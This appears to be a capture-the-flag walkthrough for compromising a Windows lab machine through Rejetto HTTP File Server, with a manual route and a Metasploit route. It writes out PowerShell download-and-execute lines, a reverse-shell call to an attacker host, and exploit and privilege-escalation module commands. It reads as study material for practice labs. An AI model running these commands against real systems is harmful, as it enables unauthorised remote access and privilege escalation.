# Non-Metasploit method.

Step 1 (Enumeration)
- Target has HTTPFileServer running on port 80.

Step 2 (Foot hold)
- https://www.exploit-db.com/exploits/39161
- This Rejetto HTTP File Server exploit for remote execution allows for a shell to be opened as the user running the FileServer.
- (To run you will need to change the lport and lhost, open a SimpleHTTPServer hosting a nc.exe executable and have a nc session open on the lport specified)


Step 3 (Enumeration)
- C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<lhost>:<lport>/Sherlock.ps1')
- Run a powershell script to grab the sherlock script and run it from the lhost which has SimpleHTTPServer running on a directory with sherlock script.
- Running the sherlock script gives us privilege escalation vulnerabilities to try.

Step 4 (Privilege escalation)
- powershell.exe IEX(New-Object Net.WebClient).downloadString(http://<lhost>:<lport>/<script name.ps1>')
- https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
- Using Secondary Logon Handle exploit which allows for a container to be created which runs powershell code.
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- At the end of the container add a 'Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>' adapting the lhost and lport.
- Have SimpleHTTPServer running for both call-backs and a nc listener specified on the shell lport and lhost.

Step 5 (Pilfering)

# Metasploit method.

Step 1 (Enumeration)
- Target has HTTPFileServer running on port 80.

Step 2 (Exploit)
- use exploit/windows/http/rejetto_hfs_exec
- set RHOST 10.10.10.8
- set RHOST 80
- set SRVHOST <lhost>
- set SRVPORT <lport>
- run

Step 3 (Enumeration)
- use post/multi/recon/local_exploit_suggester
- set session
- run
- (Migrate to different bit architecture process to run suggester on both 32 and 64 bit)

Step 4 (Privilege escalation)
- use exploit/ms16_032_secondary_logon_handler_privesc
- set options
- exploit

Ensure the exploit and running meterpreter sessoin being used are the same architecture

Step 5 (Pilfering)
